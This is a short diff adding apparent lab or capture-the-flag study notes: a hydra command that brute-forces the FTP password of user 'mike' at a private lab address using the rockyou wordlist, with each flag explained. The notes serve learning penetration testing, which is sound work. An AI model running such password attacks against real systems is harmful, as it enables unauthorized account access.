@@ -1,0 +1,6 @@
+hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.195.6 ftp - bruteforce the password of the FTP server
+  -t 4         - parallel connections per target
+  -l user_name - points to the user who's account you're trying to compromise
+  -P           - Points to the wordlist
+  -vV          - Sets verbose mode to very verbose, shows the login+pass combination for each attempt
+
